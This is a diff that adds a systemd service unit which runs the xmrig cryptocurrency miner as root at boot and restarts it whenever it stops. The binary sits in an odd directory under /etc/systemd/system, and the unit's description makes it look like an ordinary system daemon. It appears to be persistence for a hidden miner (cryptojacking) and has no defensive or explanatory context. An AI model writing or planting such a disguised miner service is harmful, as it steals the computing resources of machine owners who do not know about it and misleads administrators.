@@ -1,0 +1,11 @@
+[Unit]
+Description= x-mrig - xamical systemctl daemon
+After=network.target
+
+[Service]
+User=root
+ExecStart=/etc/systemd/system/daemon/xmrig -c config.json
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
